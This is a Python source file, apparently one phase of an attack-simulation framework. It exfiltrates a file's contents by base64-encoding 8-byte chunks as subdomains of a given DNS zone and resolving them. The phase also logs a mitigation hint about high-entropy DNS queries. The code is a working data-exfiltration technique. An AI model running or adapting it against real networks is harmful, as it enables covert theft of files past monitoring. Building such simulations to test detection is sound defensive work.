import logging
from StringIO import StringIO
from socket import gethostbyname, setdefaulttimeout
from ai_utils.phases.abstract_phase import AbstractPhaseClass
from ai_utils.scenarios.globals import FileUtils, StringUtils, ScenarioUtils, PathUtils
import os


class FileExfiltrationOverDnsPhaseClass(AbstractPhaseClass):
  TrackerId = "131"
  Subject = "Ex-Filtrate data over dns"
  Description = "Ex-Filtrate data over dns"

  def __init__(self, isPhaseCritical, dnsZone, filePath, maxBytesToExfiltrate=None):
    AbstractPhaseClass.__init__(self, isPhaseCritical)
    self.DnsZone = dnsZone
    self.PhaseReporter.Debug('DNS Zone parameter set to: {0}'.format(self.DnsZone))
    self.DataToExfiltrate = FileUtils.ReadFromFile(filePath)
    self.PhaseReporter.Debug('Data to exfiltrate will be read from file: {0}'.format(filePath))
    self.MaxBytesToExfitrate = self.SetupMaxBytesParameter(maxBytesToExfiltrate, filePath)
    self.PhaseReporter.Debug('Max Bytes to Exfiltrate parameter set to: {0}'.format(self.MaxBytesToExfitrate))
    self.BytesExfiltrated = 0
    self.FileName = PathUtils.GetFilenameWithExt(filePath)

  def Setup(self):
    if StringUtils.IsEmptyOrNull(self.DnsZone):
      self.PhaseReporter.Error('No DNS zone provided. Phase will fail')
      return False
    if StringUtils.IsEmptyOrNull(self.DataToExfiltrate):
      self.PhaseReporter.Error('Data to be exfiltrated could not be retrieved. Phase will fail')
      return False
    if self.MaxBytesToExfitrate <= 0:
      self.PhaseReporter.Error('Maximum bytes to be exfiltrated should be more than 0. Phase will fail')
      return False
    return True

  def Run(self):
    self.PhaseReporter.Info('Exfiltrating {} bytes of data through DNS A Record queries...'.format(self.MaxBytesToExfitrate))
    phaseSuccessful = self.BreakDataAndExfiltrate()
    if phaseSuccessful:
      self.PhaseReporter.Info('Successfully exfiltrated data over DNS A Record')
      self.PhaseReporter.Mitigation('Inspect all periodical and suspicious (high entropy) DNS queries as done via {}'.format(self.DnsZone))
    else:
      self.PhaseReporter.Info('Failed to exfiltrate data over DNS A Record')
    return phaseSuccessful

  def BreakDataAndExfiltrate(self):
    setdefaulttimeout(0.0001)
    dataToExfiltrate = StringIO(self.DataToExfiltrate)
    partNumber = 0
    self.PhaseReporter.Debug('Breaking data in blocks of 8 bytes...')
    self.PhaseReporter.Debug('Each 8-byte block will be base64 encoded and used as a subdomain in domain to be resolved using the provided DNS server')
    while self.BytesExfiltrated < self.MaxBytesToExfitrate:
      partData = dataToExfiltrate.read(8)
      if not partData:
        logging.info("File Exfiltration over DNS A Record completed successfully")
        break
      packedData = ScenarioUtils.PackData(partNumber, partData)
      packedAndEncodedData = ScenarioUtils.Base64EncodeData(packedData)
      self.Exfiltrate(packedAndEncodedData)
      partNumber += 1
    return self.BytesExfiltrated > 0

  def Exfiltrate(self, data):
    try:
      domainToBeResolved = '{}.{}'.format(data, self.DnsZone)
      gethostbyname(domainToBeResolved)
    except:
      pass
    self.BytesExfiltrated += len(data)

  def SetupMaxBytesParameter(self, maxBytes, filePath):
    if maxBytes and type(maxBytes) == int and maxBytes >= 0:
      param = maxBytes
    else:
      self.PhaseReporter.Warn('Maximum Bytes to Exfiltrate parameter is not valid. Parameter will be set from the size of the file to exfiltrate...')
      param = self.GetFileSize(filePath)
    return param

  def GetFileSize(self, filePath):
    param = 0
    try:
      param = os.stat(filePath).st_size
    except Exception as e:
      self.PhaseReporter.Error('Size of the file "{}" could not be retrieved. Error: {}'.format(filePath, e))
    return param
